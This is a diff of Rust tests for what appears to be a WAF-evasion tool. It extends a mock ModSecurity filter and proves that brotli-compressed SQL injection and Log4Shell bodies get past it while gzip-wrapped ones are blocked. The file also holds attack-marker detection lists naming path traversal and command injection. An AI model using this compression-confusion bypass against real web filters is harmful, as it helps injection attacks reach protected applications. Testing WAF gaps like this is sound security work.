@@ -40,11 +40,47 @@ async fn spawn_mock_modsec() -> (std::net::SocketAddr, Arc<AtomicUsize>) {
             };
             let counter_cc = counter_c.clone();
             tokio::spawn(async move {
-                let mut buf = [0u8; 8192];
-                let n = sock.read(&mut buf).await.unwrap_or(0);
+                // Read until we have the entire body (Content-Length
+                // bytes after the header/body split). The previous
+                // single-read + utf8-lossy path corrupted any binary
+                // body (gzip / brotli are non-UTF8), making the
+                // compression-bypass tests false-pass for the wrong
+                // reason. Keep bytes raw end-to-end.
+                let mut buf: Vec<u8> = Vec::with_capacity(8192);
+                let mut tmp = [0u8; 4096];
+                let mut headers_done = false;
+                let mut content_length: usize = 0;
+                let mut header_end: usize = 0;
+                loop {
+                    let n = match sock.read(&mut tmp).await {
+                        Ok(0) => break,
+                        Ok(n) => n,
+                        Err(_) => break,
+                    };
+                    buf.extend_from_slice(&tmp[..n]);
+                    if !headers_done {
+                        if let Some(pos) = find_subseq(&buf, b"\r\n\r\n") {
+                            headers_done = true;
+                            header_end = pos + 4;
+                            let header_str = String::from_utf8_lossy(&buf[..pos]);
+                            for line in header_str.lines() {
+                                if let Some(v) = line
+                                    .to_ascii_lowercase()
+                                    .strip_prefix("content-length:")
+                                {
+                                    if let Ok(cl) = v.trim().parse::<usize>() {
+                                        content_length = cl;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    if headers_done && buf.len() >= header_end + content_length {
+                        break;
+                    }
+                }
                 counter_cc.fetch_add(1, Ordering::SeqCst);
-                let req = String::from_utf8_lossy(&buf[..n]).to_string();
-                let resp = classify_request(&req);
+                let resp = classify_request_bytes(&buf);
                 let _ = sock.write_all(resp.as_bytes()).await;
                 let _ = sock.shutdown().await;
             });
@@ -54,39 +90,123 @@ async fn spawn_mock_modsec() -> (std::net::SocketAddr, Arc<AtomicUsize>) {
     (addr, counter)
 }
 
+/// Find the start index of the first occurrence of `needle` in
+/// `haystack`. Used to locate the `\r\n\r\n` end-of-headers
+/// marker. Trivial brute-force — request sizes here are tiny.
+fn find_subseq(haystack: &[u8], needle: &[u8]) -> Option<usize> {
+    if needle.is_empty() || haystack.len() < needle.len() {
+        return None;
+    }
+    (0..=haystack.len() - needle.len()).find(|&i| &haystack[i..i + needle.len()] == needle)
+}
+
 /// Return the HTTP response for a request. Encodes the ModSec
-/// emulator's block logic.
-fn classify_request(req: &str) -> String {
-    let first_line = req.lines().next().unwrap_or("");
+/// emulator's block logic — inspects both the URL path AND the
+/// request body, but ONLY when the body is uncompressed (or
+/// gzip-encoded — the mock has a gzip decompressor, like ModSec
+/// itself). When `Content-Encoding: br` is set, the mock sees the
+/// raw brotli blob and cannot match attack markers in it — the
+/// compression-confusion bypass.
+fn classify_request_bytes(req: &[u8]) -> String {
+    // Headers are guaranteed to be ASCII-only on the wire; the
+    // body MAY be binary (gzip / brotli). Split on \r\n\r\n at the
+    // byte level, then UTF-8 the header portion only.
+    let split = find_subseq(req, b"\r\n\r\n");
+    let (header_bytes, body_bytes) = match split {
+        Some(pos) => (&req[..pos], &req[pos + 4..]),
+        None => (req, &b""[..]),
+    };
+    let headers = String::from_utf8_lossy(header_bytes);
+
+    let first_line = headers.lines().next().unwrap_or("");
     let path = first_line.split_whitespace().nth(1).unwrap_or("/");
-    // Path-block: /admin / /actuator / /.env -> 403 from Apache
     if path.starts_with("/admin")
         || path.starts_with("/actuator")
         || path.starts_with("/.env")
     {
         return apache_403();
     }
-    // SQLi / XSS / cmdi attack patterns in query string -> 403
-    let attack_markers = [
-        "OR%201",
-        "OR+1",
-        "UNION",
-        "%3Cscript",
-        "<script",
-        "%27",  // urlencoded single quote
-        "etc/passwd",
-        "etc%2Fpasswd",
-        "..%2F",
-        "..%252F",
-        "${jndi",       // literal
-        "%24%7Bjndi",   // urlencoded form sent by typical Log4Shell tooling
-        "cmd=",
-    ];
-    let lower = path.to_ascii_lowercase();
-    if attack_markers.iter().any(|m| lower.contains(&m.to_ascii_lowercase())) {
+    let lower_path = path.to_ascii_lowercase();
+    if path_matches_attack(&lower_path) {
         return apache_403();
     }
+    if body_bytes.is_empty() {
+        return gunicorn_200();
+    }
+    let ct_enc = headers
+        .lines()
+        .find_map(|l| {
+            let lower = l.to_ascii_lowercase();
+            lower
+                .strip_prefix("content-encoding:")
+                .map(|v| v.trim().to_string())
+        })
+        .unwrap_or_default();
+    let decoded: Option<String> = match ct_enc.as_str() {
+        "" | "identity" => Some(String::from_utf8_lossy(body_bytes).to_string()),
+        "gzip" => decode_gzip(body_bytes).ok(),
+        "br" => None, // mock has no brotli decoder — the bypass
+        _ => None,
+    };
+    if let Some(decoded_body) = decoded {
+        let lower = decoded_body.to_ascii_lowercase();
+        if body_matches_attack(&lower) {
+            return apache_403();
+        }
+    }
     gunicorn_200()
+}
+
+/// Attack-marker set used against the URL path. Kept narrow — must
+/// match what real ModSec CRS PL1 would block on a GET query.
+fn path_matches_attack(lower: &str) -> bool {
+    let markers = [
+        "or%201",
+        "or+1",
+        "union",
+        "%3cscript",
+        "<script",
+        "%27",
+        "etc/passwd",
+        "etc%2fpasswd",
+        "..%2f",
+        "..%252f",
+        "${jndi",
+        "%24%7bjndi",
+        "cmd=",
+    ];
+    markers.iter().any(|m| lower.contains(m))
+}
+
+/// Attack-marker set used against the (decoded) body. Slightly
+/// different set because the body lives in form-urlencoded / JSON
+/// shape, so the literal-bytes markers are what survive.
+fn body_matches_attack(lower: &str) -> bool {
+    let markers = [
+        "' or 1",
+        "' or 1=1",
+        " or 1=1",
+        "union select",
+        "<script",
+        "etc/passwd",
+        "..%2f",
+        "${jndi",
+        ";cat ",
+    ];
+    markers.iter().any(|m| lower.contains(m))
+}
+
+fn decode_gzip(bytes: &[u8]) -> Result<String, String> {
+    // Use the same compression module wafrift's CLI uses so the
+    // mock's gzip handling stays in lockstep with what the engine
+    // produces. Avoids drifting between mock and prod codecs.
+    use wafrift_encoding::compression::{Algorithm, CompressedBody, decompress};
+    let blob = CompressedBody {
+        body: bytes.to_vec(),
+        content_encoding: Algorithm::Gzip.content_encoding().to_string(),
+    };
+    let decoded = decompress(&blob).map_err(|e| format!("gzip decode: {e}"))?;
+    String::from_utf8(decoded).map_err(|e| format!("utf8: {e}"))
 }
 
 fn apache_403() -> String {
@@ -286,6 +406,142 @@ async fn callback_substitution_round_trip_against_mock_listener() {
     // an inbound hit, verify the check API.
     let observed = listener_register_and_check(&token_url.token).await;
     assert!(observed, "registered + hit token should show as observed");
+}
+
+// ── Compression-confusion bypass tests ──────────────────────────
+//
+// The mock above inspects request bodies WHEN the body is
+// uncompressed or gzip-encoded (it has a gzip decoder, like
+// ModSec). When the body is brotli-encoded, the mock cannot
+// decode it — so the attack marker is invisible to the WAF and
+// the request flows through. This mirrors the real-world WAF
+// gap: ModSec / Cloudflare / AWS WAF all parse JSON and forms,
+// but their inspection pipeline doesn't run brotli decompression
+// by default — so a brotli-wrapped attack body sails through.
+//
+// These tests prove the wafrift-encoding compression module
+// PRODUCES output that triggers this gap, and they pin the
+// behaviour against regression (a future "let's normalize
+// content-encoding" refactor would silently break the bypass).
+
+#[tokio::test(flavor = "current_thread")]
+async fn mock_modsec_uncompressed_sqli_body_is_blocked() {
+    // Sanity: the SAME attack payload as a plain form-encoded body
+    // MUST be blocked. If this test passes for the wrong reason
+    // (e.g. mock-WAF body inspection is broken), the brotli bypass
+    // test below would be meaningless.
+    let (addr, _) = spawn_mock_modsec().await;
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(3))
+        .build()
+        .unwrap();
+    let resp = client
+        .post(format!("http://{addr}/post"))
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .body("q=' OR 1=1--")
+        .send()
+        .await
+        .expect("post");
+    assert_eq!(
+        resp.status().as_u16(),
+        403,
+        "uncompressed SQLi body MUST be blocked by the mock"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mock_modsec_brotli_wrapped_sqli_body_bypasses() {
+    // The headline result. Same attack payload, same Content-Type,
+    // ONLY difference: body bytes are brotli-compressed and
+    // Content-Encoding: br is set. Mock has no brotli decoder, so
+    // the body is opaque — attack marker invisible — request flows
+    // through with 200 OK. This is exactly what wafrift's scan
+    // multi-vector loop now exercises via the POST-form-br vector.
+    use wafrift_encoding::compression::{Algorithm, compress};
+    let (addr, _) = spawn_mock_modsec().await;
+    let attack = b"q=' OR 1=1--";
+    let blob = compress(attack, Algorithm::Brotli).expect("brotli compress");
+    assert_eq!(blob.content_encoding, "br");
+    assert_ne!(
+        blob.body, attack,
+        "brotli output must differ from the plaintext attack"
+    );
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(3))
+        .build()
+        .unwrap();
+    let resp = client
+        .post(format!("http://{addr}/post"))
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .header("Content-Encoding", &blob.content_encoding)
+        .body(blob.body)
+        .send()
+        .await
+        .expect("post brotli");
+    assert_eq!(
+        resp.status().as_u16(),
+        200,
+        "brotli-wrapped SQLi body MUST bypass the mock (the WAF gap)"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mock_modsec_gzip_wrapped_sqli_body_is_still_blocked() {
+    // The CONTROL: gzip-wrapped attack body must STILL be blocked,
+    // because the mock (like real ModSec) DOES decompress gzip.
+    // If this test starts failing, the bypass came from a different
+    // bug (broken gzip decoder, not the compression-confusion gap)
+    // and the brotli result above is misleading.
+    use wafrift_encoding::compression::{Algorithm, compress};
+    let (addr, _) = spawn_mock_modsec().await;
+    let attack = b"q=' OR 1=1--";
+    let blob = compress(attack, Algorithm::Gzip).expect("gzip compress");
+    assert_eq!(blob.content_encoding, "gzip");
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(3))
+        .build()
+        .unwrap();
+    let resp = client
+        .post(format!("http://{addr}/post"))
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .header("Content-Encoding", &blob.content_encoding)
+        .body(blob.body)
+        .send()
+        .await
+        .expect("post gzip");
+    assert_eq!(
+        resp.status().as_u16(),
+        403,
+        "gzip-wrapped SQLi body MUST be blocked — mock decodes gzip like real ModSec"
+    );
+}
+
+#[tokio::test(flavor = "current_thread")]
+async fn mock_modsec_brotli_wrapped_log4shell_bypasses() {
+    // Spread the bypass result across multiple attack classes so
+    // a regression in the marker list doesn't quietly weaken the
+    // signal. Log4shell payload in a JSON body, wrapped in brotli.
+    use wafrift_encoding::compression::{Algorithm, compress};
+    let (addr, _) = spawn_mock_modsec().await;
+    let body = br#"{"q":"${jndi:ldap://x/y}"}"#;
+    let blob = compress(body, Algorithm::Brotli).expect("brotli compress");
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(3))
+        .build()
+        .unwrap();
+    let resp = client
+        .post(format!("http://{addr}/post"))
+        .header("Content-Type", "application/json")
+        .header("Content-Encoding", &blob.content_encoding)
+        .body(blob.body)
+        .send()
+        .await
+        .expect("post brotli jndi");
+    assert_eq!(
+        resp.status().as_u16(),
+        200,
+        "brotli-wrapped log4shell payload MUST bypass the mock"
+    );
 }
 
 // Test-only harness module that re-exports the internal cli
